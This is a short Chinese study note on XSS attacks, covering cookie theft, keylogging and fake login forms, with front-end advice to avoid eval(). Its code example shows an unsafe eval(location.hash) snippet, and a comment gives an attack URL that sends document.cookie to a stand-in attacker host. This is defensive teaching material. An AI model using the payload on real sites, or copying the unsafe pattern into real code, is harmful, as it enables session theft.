## XSS 攻击

如果页面被注入了恶意 JavaScript 脚本，它可以做哪些事情呢？

1. **可以窃取 cookie 信息**。恶意 JavaScript 可以通过 ”doccument.cookie“获取cookie信息，然后通过 XMLHttpRequest或者Fetch加上CORS功能将数据发送给恶意服务器；恶意服务器拿到用户的cookie信息之后，就可以在其他电脑上模拟用户的登陆，然后进行转账操作。
2. **可以监听用户行为**。恶意 JavaScript 可以使用 addEventListener 接口来监听键盘事件，比如可以获取用户输入的银行卡等信息，又可以做很多违法的事情。
3. 可以**修改DOM**伪造假的登陆窗口，用来欺骗用户输入用户名和密码等信息。
4. 还可以在页面内生成浮窗广告，这些广告会严重影响用户体验。

资料主要谈后端防 XSS 攻击。

那前端如何防 XSS 攻击？首先尽量不用`eval()`，它使用不当会发生这样的事情。

举一个场景，服务器返回前端代码有这样一句`eval(decodeURI(location.hash.substr(1))`。它会将 URL 中的锚点字符串取出并作为 JS 脚本执行。

```js
/**
 * 1. 下面包含使用 eval() 不当的代码的网页地址为 'http://domain.com'。
 * 2. 包含攻击代码的 URL 为 'http://domain.com#new Image().src="http://badass.com/"+document.cookie,
 * 3. 当用户访问了包含攻击代码的 URL 时（如随便点击不明链接），会在用户浏览器向第三方网站（坏人的网站）发送 GET 请求，将 cookie 泄露。
 */
let scriptStr = location.hash.substr(1)
eval(decodeURI(scriptStr))
```



## 阅读资料

[web安全之XSS实例解析](https://segmentfault.com/a/1190000022819450)



